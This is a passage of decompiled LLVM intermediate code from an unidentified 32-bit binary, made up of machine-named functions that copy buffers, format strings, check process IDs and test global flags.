  %v3_4031d0 = load i32, i32* %v2_4031d0, align 4
  %v2_4031d8 = icmp eq i32 %v3_4031d0, 1
  br i1 %v2_4031d8, label %dec_label_pc_4030b8, label %dec_label_pc_4031dc

dec_label_pc_4031dc:                              ; preds = %dec_label_pc_4031ac, %dec_label_pc_40308c
  ret i32 0

; uselistorder directives
  uselistorder i32 %stack_var_-16.16, { 2, 1, 0 }
  uselistorder i32* %stack_var_-12, { 2, 0, 1 }
  uselistorder label %dec_label_pc_4031ac, { 1, 0 }
  uselistorder label %dec_label_pc_403130, { 1, 0 }
  uselistorder label %dec_label_pc_4030b8, { 1, 0 }
}

define i32 @function_403218() local_unnamed_addr {
dec_label_pc_403218:
  %v3_403248 = load i32, i32* @global_var_41b180.77, align 4
  store i32 %v3_403248, i32* @global_var_41b338.78, align 4
  %v1_403278 = icmp eq i32 %v3_403248, 0
  br i1 %v1_403278, label %dec_label_pc_403318, label %dec_label_pc_403314

dec_label_pc_403314:                              ; preds = %dec_label_pc_403218
  store i32 %v3_403248, i32* @global_var_41b33c.79, align 4
  br label %dec_label_pc_403318

dec_label_pc_403318:                              ; preds = %dec_label_pc_403218, %dec_label_pc_403314
  %storemerge = phi i32 [ 1, %dec_label_pc_403314 ], [ 0, %dec_label_pc_403218 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder label %dec_label_pc_403318, { 1, 0 }
}

define i32 @function_403330() local_unnamed_addr {
dec_label_pc_403330:
  %v3_403350 = load i32, i32* @global_var_41b338.78, align 4
  %v1_403358 = icmp eq i32 %v3_403350, 0
  br i1 %v1_403358, label %dec_label_pc_403390, label %dec_label_pc_40335c

dec_label_pc_40335c:                              ; preds = %dec_label_pc_403330
  store i32 0, i32* @global_var_41b338.78, align 4
  br label %dec_label_pc_403390

dec_label_pc_403390:                              ; preds = %dec_label_pc_403330, %dec_label_pc_40335c
  %v3_403394 = load i32, i32* @global_var_41b33c.79, align 4
  %v1_40339c = icmp eq i32 %v3_403394, 0
  br i1 %v1_40339c, label %dec_label_pc_4033d4, label %dec_label_pc_4033a0

dec_label_pc_4033a0:                              ; preds = %dec_label_pc_403390
  store i32 0, i32* @global_var_41b33c.79, align 4
  br label %dec_label_pc_4033d4

dec_label_pc_4033d4:                              ; preds = %dec_label_pc_403390, %dec_label_pc_4033a0
  %v1_4033e4 = phi i32 [ 0, %dec_label_pc_403390 ], [ ptrtoint (i32* @global_var_420000.2 to i32), %dec_label_pc_4033a0 ]
  ret i32 %v1_4033e4

; uselistorder directives
  uselistorder label %dec_label_pc_4033d4, { 1, 0 }
  uselistorder label %dec_label_pc_403390, { 1, 0 }
}

define i32 @function_4033f0(i32 %arg1, i32 %arg2, i16 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_4033f0:
  %stack_var_-268 = alloca i32, align 4
  %v1_403494 = add i32 %arg4, 3
  %v2_403494 = inttoptr i32 %v1_403494 to i8*
  %v3_403494 = load i8, i8* %v2_403494, align 1
  %v1_40349c = icmp eq i8 %v3_403494, 0
  br i1 %v1_40349c, label %dec_label_pc_403508, label %dec_label_pc_4034a0

dec_label_pc_4034a0:                              ; preds = %dec_label_pc_4033f0
  %v1_4034ac = add i32 %arg4, 4
  %v2_4034ac = inttoptr i32 %v1_4034ac to i32*
  %v3_4034ac = load i32, i32* %v2_4034ac, align 4
  %v1_4034b4 = icmp eq i32 %v3_4034ac, 0
  br i1 %v1_4034b4, label %dec_label_pc_4034b8, label %dec_label_pc_4034c8

dec_label_pc_4034b8:                              ; preds = %dec_label_pc_4034a0
  br label %dec_label_pc_403594

dec_label_pc_4034c8:                              ; preds = %dec_label_pc_4034a0
  %v3_4034d0 = load i32, i32* %v2_4034ac, align 4
  %v3_4034dc = load i8, i8* %v2_403494, align 1
  %v4_4034dc = zext i8 %v3_4034dc to i32
  %v5_4034fc = inttoptr i32 %v3_4034d0 to i32*
  %v6_4034fc = call i32* @memcpy(i32* nonnull %stack_var_-268, i32* %v5_4034fc, i32 %v4_4034dc)
  br label %dec_label_pc_403508

dec_label_pc_403508:                              ; preds = %dec_label_pc_4033f0, %dec_label_pc_4034c8
  %v3_40354c = load i32, i32* @global_var_41b170.72, align 4
  %v3_403570 = load i8, i8* %v2_403494, align 1
  %v4_403570 = zext i8 %v3_403570 to i32
  %v1_403578 = add nuw nsw i32 %v4_403570, 4
  %v2_40357c = icmp eq i32 %v3_40354c, %v1_403578
  br i1 %v2_40357c, label %dec_label_pc_403590, label %dec_label_pc_403580

dec_label_pc_403580:                              ; preds = %dec_label_pc_403508
  br label %dec_label_pc_403594

dec_label_pc_403590:                              ; preds = %dec_label_pc_403508
  br label %dec_label_pc_403594

dec_label_pc_403594:                              ; preds = %dec_label_pc_403580, %dec_label_pc_4034b8, %dec_label_pc_403590
  %v1_4035a4 = phi i32 [ 0, %dec_label_pc_403580 ], [ 0, %dec_label_pc_4034b8 ], [ 1, %dec_label_pc_403590 ]
  ret i32 %v1_4035a4

; uselistorder directives
  uselistorder i8* %v2_403494, { 1, 0, 2 }
  uselistorder label %dec_label_pc_403594, { 2, 0, 1 }
  uselistorder label %dec_label_pc_403508, { 1, 0 }
}

define i32 @function_4035ac(i32 %arg1, i32 %arg2, i32 %arg3, i8* %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_4035ac:
  %tmp = ptrtoint i8* %arg4 to i32
  %stack_var_-268 = alloca i32, align 4
  %tmp16 = call i32 @__decompiler_undefined_function_0()
  %v3_403608 = load i32, i32* @global_var_41b174.73, align 4
  %v1_403620 = icmp ult i32 %v3_403608, 4
  %v1_403624 = icmp eq i1 %v1_403620, false
  br i1 %v1_403624, label %dec_label_pc_403638, label %dec_label_pc_403628

dec_label_pc_403628:                              ; preds = %dec_label_pc_4035ac
  br label %dec_label_pc_403750

dec_label_pc_403638:                              ; preds = %dec_label_pc_4035ac
  %v2_403688 = call i32 @llvm.bswap.i32(i32 %tmp16)
  %v2_40369c = bitcast i8* %arg4 to i32*
  store i32 %v2_403688, i32* %v2_40369c, align 4
  %v2_4036a8 = load i8, i8* %arg4, align 1
  %v2_4036b0 = icmp eq i8 %v2_4036a8, -113
  br i1 %v2_4036b0, label %dec_label_pc_4036c4, label %dec_label_pc_4036b4

dec_label_pc_4036b4:                              ; preds = %dec_label_pc_403638
  br label %dec_label_pc_403750

dec_label_pc_4036c4:                              ; preds = %dec_label_pc_403638
  %v1_4036cc = add i32 %tmp, 3
  %v2_4036cc = inttoptr i32 %v1_4036cc to i8*
  %v3_4036cc = load i8, i8* %v2_4036cc, align 1
  %v1_4036d4 = icmp eq i8 %v3_4036cc, 0
  br i1 %v1_4036d4, label %dec_label_pc_4036d8, label %dec_label_pc_4036e8

dec_label_pc_4036d8:                              ; preds = %dec_label_pc_4036c4
  br label %dec_label_pc_403750

dec_label_pc_4036e8:                              ; preds = %dec_label_pc_4036c4
  %v1_4036f0 = add i32 %tmp, 4
  %v2_4036f0 = inttoptr i32 %v1_4036f0 to i32*
  %v3_4036f0 = load i32, i32* %v2_4036f0, align 4
  %v1_4036f8 = icmp eq i32 %v3_4036f0, 0
  br i1 %v1_4036f8, label %dec_label_pc_4036fc, label %dec_label_pc_40370c

dec_label_pc_4036fc:                              ; preds = %dec_label_pc_4036e8
  br label %dec_label_pc_403750

dec_label_pc_40370c:                              ; preds = %dec_label_pc_4036e8
  %v3_403714 = load i32, i32* %v2_4036f0, align 4
  %v3_403720 = load i8, i8* %v2_4036cc, align 1
  %v4_403720 = zext i8 %v3_403720 to i32
  %v4_403740 = inttoptr i32 %v3_403714 to i32*
  %v6_403740 = call i32* @memcpy(i32* %v4_403740, i32* nonnull %stack_var_-268, i32 %v4_403720)
  br label %dec_label_pc_403750

dec_label_pc_403750:                              ; preds = %dec_label_pc_4036fc, %dec_label_pc_4036d8, %dec_label_pc_4036b4, %dec_label_pc_403628, %dec_label_pc_40370c
  %v1_403760 = phi i32 [ 0, %dec_label_pc_4036fc ], [ 1, %dec_label_pc_4036d8 ], [ 0, %dec_label_pc_4036b4 ], [ 0, %dec_label_pc_403628 ], [ 1, %dec_label_pc_40370c ]
  ret i32 %v1_403760

; uselistorder directives
  uselistorder i8* %arg4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_403750, { 4, 0, 1, 2, 3 }
}

define i32 @function_403768(i32 %arg1) local_unnamed_addr {
dec_label_pc_403768:
  %stack_var_0 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-276 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_0, align 4
  %v1_403bf88 = add i32 %arg1, 12
  %v2_403bf89 = inttoptr i32 %v1_403bf88 to i32*
  %v3_403bf810 = load i32, i32* %v2_403bf89, align 4
  %v2_403c0011 = icmp eq i32 %v3_403bf810, 1
  br i1 %v2_403c0011, label %dec_label_pc_403790.lr.ph, label %dec_label_pc_403c04

dec_label_pc_403790.lr.ph:                        ; preds = %dec_label_pc_403768
  %v2_403850 = ptrtoint i32* %stack_var_-276 to i32
  %v1_403894 = add i32 %v2_403850, 8
  %v2_4038a0 = add i32 %v2_403850, 4
  %v3_4038a0 = inttoptr i32 %v2_4038a0 to i32*
  %v2_4038a8 = ptrtoint i32* %stack_var_-288 to i32
  %v2_4038ac = ptrtoint i32* %stack_var_-284 to i32
  %v2_4038b0 = ptrtoint i32* %stack_var_-280 to i32
  %v5_4038c4 = bitcast i32* %stack_var_-276 to i8*
  %v1_403900 = or i32 %v2_403850, 2
  %v2_403900 = inttoptr i32 %v1_403900 to i8*
  br label %dec_label_pc_403790

dec_label_pc_403790:                              ; preds = %dec_label_pc_403790.lr.ph, %dec_label_pc_403bf0.backedge
  %v3_403b942 = phi i32 [ %arg1, %dec_label_pc_403790.lr.ph ], [ %v3_403bf0, %dec_label_pc_403bf0.backedge ]
  %v3_4037a8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_4230f0.1 to i32), i32 -32616) to i32*), align 4
  store i32 %v3_4037a8, i32* %stack_var_-292, align 4
  %v1_4037cc = icmp slt i32 %v3_4037a8, 0
  br i1 %v1_4037cc, label %dec_label_pc_403bf0.backedge, label %dec_label_pc_4037d0

dec_label_pc_4037d0:                              ; preds = %dec_label_pc_403790
  %v3_4037e8 = load i32, i32* @global_var_41b168.70, align 4
  %v1_403800 = icmp eq i32 %v3_4037e8, 0
  br i1 %v1_403800, label %dec_label_pc_40384c, label %dec_label_pc_403804

dec_label_pc_403804:                              ; preds = %dec_label_pc_4037d0
  br label %dec_label_pc_40384c

dec_label_pc_40384c:                              ; preds = %dec_label_pc_4037d0, %dec_label_pc_403804
  %v1_403b9c3 = add i32 %v3_403b942, 12
  %v2_403b9c4 = inttoptr i32 %v1_403b9c3 to i32*
  %v3_403b9c5 = load i32, i32* %v2_403b9c4, align 4
  %v2_403ba46 = icmp eq i32 %v3_403b9c5, 1
  br i1 %v2_403ba46, label %dec_label_pc_403860, label %dec_label_pc_403bf0.backedge

dec_label_pc_403860:                              ; preds = %dec_label_pc_40384c, %dec_label_pc_403b94.backedge
  store i32 0, i32* %stack_var_-280, align 4
  %v3_403874 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_4230f0.1 to i32), i32 -32464) to i32*), align 4
  call void @__pseudo_call(i32 %v3_403874)
  store i32 %v1_403894, i32* %v3_4038a0, align 4
  %v3_4038a4 = load i32, i32* %stack_var_-292, align 4
  %v6_4038c4 = call i32 @function_4035ac(i32 %v3_4038a4, i32 %v2_4038a8, i32 %v2_4038ac, i8* %v5_4038c4, i32 %v2_4038b0)
  %v1_4038d0 = urem i32 %v6_4038c4, 256
  %v1_4038d8 = icmp eq i32 %v1_4038d0, 1
  br i1 %v1_4038d8, label %dec_label_pc_4038f8, label %dec_label_pc_4038dc

dec_label_pc_4038dc:                              ; preds = %dec_label_pc_403860
  %v3_4038e0 = load i32, i32* %stack_var_-280, align 4
  %v1_4038e8 = icmp eq i32 %v3_4038e0, 0
  br i1 %v1_4038e8, label %dec_label_pc_403b94.backedge, label %dec_label_pc_4038dc.dec_label_pc_403bac_crit_edge

dec_label_pc_403b94.backedge:                     ; preds = %dec_label_pc_4038dc, %dec_label_pc_4038f8, %dec_label_pc_403910
  %v3_403b94 = load i32, i32* %stack_var_0, align 4
  %v1_403b9c = add i32 %v3_403b94, 12
  %v2_403b9c = inttoptr i32 %v1_403b9c to i32*
  %v3_403b9c = load i32, i32* %v2_403b9c, align 4
  %v2_403ba4 = icmp eq i32 %v3_403b9c, 1
  br i1 %v2_403ba4, label %dec_label_pc_403860, label %dec_label_pc_403bf0.backedge

dec_label_pc_4038f8:                              ; preds = %dec_label_pc_403860
  %v3_403900 = load i8, i8* %v2_403900, align 2
  %v1_403908 = icmp ult i8 %v3_403900, 2
  %v1_40390c = icmp eq i1 %v1_403908, false
  br i1 %v1_40390c, label %dec_label_pc_403b94.backedge, label %dec_label_pc_403910

dec_label_pc_403910:                              ; preds = %dec_label_pc_4038f8
  br label %dec_label_pc_403b94.backedge

dec_label_pc_4038dc.dec_label_pc_403bac_crit_edge: ; preds = %dec_label_pc_4038dc
  %v3_403bf0.pre.pre = load i32, i32* %stack_var_0, align 4
  br label %dec_label_pc_403bf0.backedge

dec_label_pc_403bf0.backedge:                     ; preds = %dec_label_pc_403b94.backedge, %dec_label_pc_403790, %dec_label_pc_40384c, %dec_label_pc_4038dc.dec_label_pc_403bac_crit_edge
  %v3_403bf0 = phi i32 [ %v3_403bf0.pre.pre, %dec_label_pc_4038dc.dec_label_pc_403bac_crit_edge ], [ %v3_403b942, %dec_label_pc_40384c ], [ %v3_403b942, %dec_label_pc_403790 ], [ %v3_403b94, %dec_label_pc_403b94.backedge ]
  %v1_403bf8 = add i32 %v3_403bf0, 12
  %v2_403bf8 = inttoptr i32 %v1_403bf8 to i32*
  %v3_403bf8 = load i32, i32* %v2_403bf8, align 4
  %v2_403c00 = icmp eq i32 %v3_403bf8, 1
  br i1 %v2_403c00, label %dec_label_pc_403790, label %dec_label_pc_403c04

dec_label_pc_403c04:                              ; preds = %dec_label_pc_403bf0.backedge, %dec_label_pc_403768
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_403850, { 0, 2, 1 }
  uselistorder label %dec_label_pc_403bf0.backedge, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_403b94.backedge, { 2, 1, 0 }
  uselistorder label %dec_label_pc_403860, { 1, 0 }
  uselistorder label %dec_label_pc_40384c, { 1, 0 }
  uselistorder label %dec_label_pc_403790, { 1, 0 }
}

define i32 @function_403f64(i32 %arg1, i8 %arg2) local_unnamed_addr {
dec_label_pc_403f64:
  %stack_var_0 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-276 = alloca i32, align 4
  %stack_var_-320 = alloca i32, align 4
  %v2_403f64 = ptrtoint i32* %stack_var_-320 to i32
  %v0_403f6c = load i32, i32* @fp, align 4
  store i32 %v2_403f64, i32* @fp, align 4
  store i32 %arg1, i32* %stack_var_0, align 4
  store i32 -113, i32* %stack_var_-20, align 4
  %v4_403f9c = ptrtoint i32* %stack_var_-276 to i32
  store i32 -194813587, i32* %stack_var_-276, align 4
  %v2_40406c = add i32 %v4_403f9c, 4
  %v3_40406c = inttoptr i32 %v2_40406c to i32*
  store i32 352321536, i32* %v3_40406c, align 4
  %v1_404078 = add i32 %v4_403f9c, 8
  %v2_404078 = inttoptr i32 %v1_404078 to i32*
  store i32 0, i32* %v2_404078, align 4
  %v2_4040a0 = ptrtoint i32* %stack_var_-20 to i32
  %v3_4040a4 = load i32, i32* %stack_var_0, align 4
  %v2_4040ac = call i32 @function_40423c(i32 %v3_4040a4, i32 %v2_4040a0)
  store i32 %v0_403f6c, i32* @fp, align 4
  ret i32 %v2_4040ac

; uselistorder directives
  uselistorder i32 %v4_403f9c, { 1, 0 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @function_4040cc() local_unnamed_addr {
dec_label_pc_4040cc:
  %stack_var_-40 = alloca i32, align 4
  %v2_4040cc = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_4040cc, i32* @fp, align 4
  br label %dec_label_pc_4040ec

dec_label_pc_4040ec:                              ; preds = %dec_label_pc_4040cc, %dec_label_pc_4040ec
  %storemerge1 = phi i32 [ 0, %dec_label_pc_4040cc ], [ %v1_404124, %dec_label_pc_4040ec ]
  %v1_4040f8 = mul i32 %storemerge1, 4
  %v2_404100 = add i32 %v1_4040f8, ptrtoint (i32* @global_var_41b0a0.83 to i32)
  %v1_404104 = inttoptr i32 %v2_404100 to i32*
  %v2_404104 = load i32, i32* %v1_404104, align 4
  %v3_404114 = call i32 @function_403f64(i32 %v2_404104, i8 1)
  %v1_404124 = add nuw nsw i32 %storemerge1, 1
  %v1_404134 = icmp slt i32 %v1_404124, 5
  br i1 %v1_404134, label %dec_label_pc_4040ec, label %dec_label_pc_40413c

dec_label_pc_40413c:                              ; preds = %dec_label_pc_4040ec
  ret i32 0

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 0 }
  uselistorder label %dec_label_pc_4040ec, { 1, 0 }
}

define i32 @function_404158() local_unnamed_addr {
dec_label_pc_404158:
  %v5_4041bc = call i32* @memset(i32* nonnull @global_var_434380.85, i32 0, i32 800)
  %v3_4041dc = load i32, i32* @global_var_41b180.77, align 4
  store i32 %v3_4041dc, i32* @global_var_41b340.89, align 4
  %not.v1_40420c = icmp ne i32 %v3_4041dc, 0
  %. = zext i1 %not.v1_40420c to i32
  ret i32 %.
}

define i32 @function_40423c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_40423c:
  %v3_404274 = load i32, i32* @global_var_41b164.69, align 4
  %v1_404298 = icmp slt i32 %v3_404274, 0
  br i1 %v1_404298, label %dec_label_pc_40430c.thread, label %dec_label_pc_40429c

dec_label_pc_40430c.thread:                       ; preds = %dec_label_pc_40423c
  br label %dec_label_pc_404364

dec_label_pc_40429c:                              ; preds = %dec_label_pc_40423c
  %v3_4042b4 = load i32, i32* @global_var_41b168.70, align 4
  %v1_4042cc = icmp eq i32 %v3_4042b4, 0
  br i1 %v1_4042cc, label %dec_label_pc_404318, label %dec_label_pc_4042d0

dec_label_pc_4042d0:                              ; preds = %dec_label_pc_40429c
  br label %dec_label_pc_404318

dec_label_pc_404318:                              ; preds = %dec_label_pc_40429c, %dec_label_pc_4042d0
  %v6_404334 = call i32 @function_4033f0(i32 %v3_404274, i32 %arg1, i16 5143, i32 %arg2, i32 0)
  %phitmp = urem i32 %v6_404334, 256
  br label %dec_label_pc_404364

dec_label_pc_404364:                              ; preds = %dec_label_pc_40430c.thread, %dec_label_pc_404318
  %stack_var_-16.0 = phi i32 [ %phitmp, %dec_label_pc_404318 ], [ 0, %dec_label_pc_40430c.thread ]
  ret i32 %stack_var_-16.0

; uselistorder directives
  uselistorder label %dec_label_pc_404364, { 1, 0 }
  uselistorder label %dec_label_pc_404318, { 1, 0 }
}

define i32 @function_404380() local_unnamed_addr {
dec_label_pc_404380:
  %v3_4043b0 = load i32, i32* @global_var_41b18c.88, align 4
  ret i32 %v3_4043b0
}

define i32 @function_40440c() local_unnamed_addr {
dec_label_pc_40440c:
  %v3_40442c = load i32, i32* @global_var_41b340.89, align 4
  %v1_404434 = icmp eq i32 %v3_40442c, 0
  br i1 %v1_404434, label %dec_label_pc_40446c, label %dec_label_pc_404438

dec_label_pc_404438:                              ; preds = %dec_label_pc_40440c
  store i32 0, i32* @global_var_41b340.89, align 4
  br label %dec_label_pc_40446c

dec_label_pc_40446c:                              ; preds = %dec_label_pc_40440c, %dec_label_pc_404438
  %v5_404488 = call i32* @memset(i32* nonnull @global_var_434380.85, i32 0, i32 800)
  %v3_4044a8 = load i32, i32* @global_var_41b18c.88, align 4
  ret i32 %v3_4044a8

; uselistorder directives
  uselistorder label %dec_label_pc_40446c, { 1, 0 }
}

define i32 @function_4044e0(i32 %arg1) local_unnamed_addr {
dec_label_pc_4044e0:
  %stack_var_0 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_0, align 4
  %v1_4049b02 = add i32 %arg1, 12
  %v2_4049b03 = inttoptr i32 %v1_4049b02 to i32*
  %v3_4049b04 = load i32, i32* %v2_4049b03, align 4
  %v2_4049b85 = icmp eq i32 %v3_4049b04, 1
  br i1 %v2_4049b85, label %dec_label_pc_40450c.lr.ph, label %dec_label_pc_4049bc

dec_label_pc_40450c.lr.ph:                        ; preds = %dec_label_pc_4044e0
  %v2_40453c = ptrtoint i32* %stack_var_-144 to i32
  %tmp37 = bitcast i32* %stack_var_-144 to i8*
  %v3_404510.pre = load i32, i32* @global_var_41b36c.91, align 4
  %v2_404584 = add i32 %v2_40453c, 4
  %phitmp = icmp eq i32 %v3_404510.pre, 0
  br label %dec_label_pc_40450c

dec_label_pc_40450c:                              ; preds = %dec_label_pc_40450c.lr.ph, %dec_label_pc_4049a8.backedge
  %v3_4049a820 = phi i32 [ %arg1, %dec_label_pc_40450c.lr.ph ], [ %v3_4049a8, %dec_label_pc_4049a8.backedge ]
  %v3_404510 = phi i1 [ %phitmp, %dec_label_pc_40450c.lr.ph ], [ true, %dec_label_pc_4049a8.backedge ]
  br i1 %v3_404510, label %dec_label_pc_40498c, label %dec_label_pc_40451c

dec_label_pc_40451c:                              ; preds = %dec_label_pc_40450c
  store i32 -1, i32* %stack_var_-156, align 4
  store i32 0, i32* %stack_var_-152, align 4
  %v3_404548 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_4230f0.1 to i32), i32 -32252) to i32*), align 4
  call void @__pseudo_call(i32 %v3_404548)
  %v4_404574 = call i32 @strlen(i8* %tmp37)
  %v3_4045a8 = add i32 %v2_404584, %v4_404574
  %v4_4045a8 = inttoptr i32 %v3_4045a8 to i8*
  store i8 0, i8* %v4_4045a8, align 1
  %v3_4045c0 = load i32, i32* @global_var_41b120.42, align 4
  %v1_4045d8 = urem i32 %v3_4045c0, 256
  %v1_4045e0 = icmp eq i32 %v1_4045d8, 1
  br i1 %v1_4045e0, label %dec_label_pc_4045e4, label %dec_label_pc_40451c.dec_label_pc_404640_crit_edge

dec_label_pc_40451c.dec_label_pc_404640_crit_edge: ; preds = %dec_label_pc_40451c
  %v3_404654.pre = load i32, i32* @global_var_41b124.43, align 4
  br label %dec_label_pc_404640

dec_label_pc_4045e4:                              ; preds = %dec_label_pc_40451c
  %v3_4045f4 = load i32, i32* @global_var_41b124.43, align 4
  %v1_40460c = urem i32 %v3_4045f4, 256
  %v1_404614 = icmp eq i32 %v1_40460c, 1
  br i1 %v1_404614, label %dec_label_pc_404618, label %dec_label_pc_404640

dec_label_pc_404618:                              ; preds = %dec_label_pc_4045e4
  %v3_404620 = load i32, i32* @global_var_41b36c.91, align 4
  %v1_404628 = add i32 %v3_404620, 4
  %v2_404628 = inttoptr i32 %v1_404628 to i32*
  %v3_404628 = load i32, i32* %v2_404628, align 4
  %v3_40462c = load i32, i32* %stack_var_-152, align 4
  %v2_404634 = icmp ult i32 %v3_40462c, %v3_404628
  %v1_404638 = icmp eq i1 %v2_404634, false
  br i1 %v1_404638, label %dec_label_pc_40497c, label %dec_label_pc_404640

dec_label_pc_404640:                              ; preds = %dec_label_pc_40451c.dec_label_pc_404640_crit_edge, %dec_label_pc_404618, %dec_label_pc_4045e4
  %v3_404654 = phi i32 [ %v3_404654.pre, %dec_label_pc_40451c.dec_label_pc_404640_crit_edge ], [ %v3_4045f4, %dec_label_pc_404618 ], [ %v3_4045f4, %dec_label_pc_4045e4 ]
  %v1_40466c = icmp eq i32 %v3_404654, 0
  br i1 %v1_40466c, label %dec_label_pc_4046c4, label %dec_label_pc_404670

dec_label_pc_404670:                              ; preds = %dec_label_pc_404640
  %v2_404680 = call i32 @getpid()
  %v3_404690 = load i32, i32* %stack_var_-156, align 4
  %v2_404698 = icmp eq i32 %v2_404680, %v3_404690
  br i1 %v2_404698, label %dec_label_pc_4046c4, label %dec_label_pc_40469c

dec_label_pc_40469c:                              ; preds = %dec_label_pc_404670
  br label %dec_label_pc_4046c4

dec_label_pc_4046c4:                              ; preds = %dec_label_pc_404670, %dec_label_pc_404640, %dec_label_pc_40469c
  %v3_4046c8 = load i32, i32* @global_var_41b36c.91, align 4
  %v3_4046e8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_4230f0.1 to i32), i32 -32608) to i32*), align 4
  %v1_40470c = icmp slt i32 %v3_4046e8, 0
  br i1 %v1_40470c, label %dec_label_pc_40497c, label %dec_label_pc_404710

dec_label_pc_404710:                              ; preds = %dec_label_pc_4046c4
  %v1_404720 = add i32 %v3_4046c8, 12
  %v1_404730 = add i32 %v3_4046c8, 4
  %v2_404730 = inttoptr i32 %v1_404730 to i32*
  %v3_404730 = load i32, i32* %v2_404730, align 4
  %v1_404740 = inttoptr i32 %v1_404720 to i8*
  %v11_404754 = call i32 (i8*, i8*, ...) @sprintf(i8* %tmp37, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_40a7b8.96, i32 0, i32 0), i8* %v1_404740, i32 %v3_404730)
  %v4_404778 = call i32 @strlen(i8* %tmp37)
  %v3_4047ac = load i32, i32* @global_var_41b170.72, align 4
  %v4_4047dc = call i32 @strlen(i8* %tmp37)
  %v1_4047e8 = add i32 %v4_4047dc, 1
  %v2_4047ec = icmp eq i32 %v3_4047ac, %v1_4047e8
  br i1 %v2_4047ec, label %dec_label_pc_4047f0, label %dec_label_pc_40495c

dec_label_pc_4047f0:                              ; preds = %dec_label_pc_404710
  %v3_4047f8 = load i32, i32* @global_var_41b36c.91, align 4
  %v1_404800 = add i32 %v3_4047f8, 8
  %v2_404800 = inttoptr i32 %v1_404800 to i32*
  %v3_404878 = load i32, i32* @global_var_41b174.73, align 4
  %v3_4048a0 = load i32, i32* %v2_404800, align 4
  %v2_4048a8 = icmp eq i32 %v3_404878, %v3_4048a0
  br i1 %v2_4048a8, label %dec_label_pc_4048ac, label %dec_label_pc_40495c

dec_label_pc_4048ac:                              ; preds = %dec_label_pc_4047f0
  %v3_4048e0 = load i32, i32* @global_var_41b194.99, align 4
  %v1_4048f8 = icmp eq i32 %v3_4048e0, 0
  br i1 %v1_4048f8, label %dec_label_pc_40495c, label %dec_label_pc_4048fc

dec_label_pc_4048fc:                              ; preds = %dec_label_pc_4048ac
  %v1_4048bc = add i32 %v3_4047f8, 12
  %v1_404920 = inttoptr i32 %v1_4048bc to i8*
  %v10_404930 = call i32 (i8*, i8*, ...) @sprintf(i8* %tmp37, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_40a7c0.100, i32 0, i32 0), i8* %v1_404920)
  br label %dec_label_pc_40495c

dec_label_pc_40495c:                              ; preds = %dec_label_pc_4047f0, %dec_label_pc_404710, %dec_label_pc_4048ac, %dec_label_pc_4048fc
  br label %dec_label_pc_40497c

dec_label_pc_40497c:                              ; preds = %dec_label_pc_4046c4, %dec_label_pc_404618, %dec_label_pc_40495c
  store i32 0, i32* @global_var_41b36c.91, align 4
  %v3_4049a8.pre = load i32, i32* %stack_var_0, align 4
  br label %dec_label_pc_4049a8.backedge

dec_label_pc_40498c:                              ; preds = %dec_label_pc_40450c
  br label %dec_label_pc_4049a8.backedge

dec_label_pc_4049a8.backedge:                     ; preds = %dec_label_pc_40498c, %dec_label_pc_40497c
  %v3_4049a8 = phi i32 [ %v3_4049a820, %dec_label_pc_40498c ], [ %v3_4049a8.pre, %dec_label_pc_40497c ]
  %v1_4049b0 = add i32 %v3_4049a8, 12
  %v2_4049b0 = inttoptr i32 %v1_4049b0 to i32*
  %v3_4049b0 = load i32, i32* %v2_4049b0, align 4
  %v2_4049b8 = icmp eq i32 %v3_4049b0, 1
  br i1 %v2_4049b8, label %dec_label_pc_40450c, label %dec_label_pc_4049bc

dec_label_pc_4049bc:                              ; preds = %dec_label_pc_4049a8.backedge, %dec_label_pc_4044e0
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_4046c8, { 1, 0 }
  uselistorder i32 %v3_4045f4, { 1, 2, 0 }
  uselistorder i8* %tmp37, { 1, 2, 3, 0, 4 }
  uselistorder i32* @global_var_41b124.43, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_40497c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_40495c, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_4046c4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_404640, { 1, 2, 0 }
  uselistorder label %dec_label_pc_40450c, { 1, 0 }
}

define i32 @function_4049fc(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_4049fc:
  %v1.global-to-local = alloca i32, align 4
  store i32 0, i32* %v1.global-to-local, align 4
  %v1_404a28 = add i32 %arg2, 3
  %v2_404a28 = inttoptr i32 %v1_404a28 to i8*
  %v3_404a28 = load i8, i8* %v2_404a28, align 1
  %v1_404a30 = icmp ult i8 %v3_404a28, 21
  %v2_404a30 = zext i1 %v1_404a30 to i32
  %v1_404a34 = icmp eq i1 %v1_404a30, false
  br i1 %v1_404a34, label %dec_label_pc_404f00, label %dec_label_pc_404a38

dec_label_pc_404a38:                              ; preds = %dec_label_pc_4049fc
  %v1_404a44 = add i32 %arg2, 4
  %v2_404a44 = inttoptr i32 %v1_404a44 to i32*
  %v3_404a44 = load i32, i32* %v2_404a44, align 4
  %v1_404a84 = inttoptr i32 %v3_404a44 to i32*
  br label %dec_label_pc_404b10

dec_label_pc_404a64:                              ; preds = %dec_label_pc_404b10
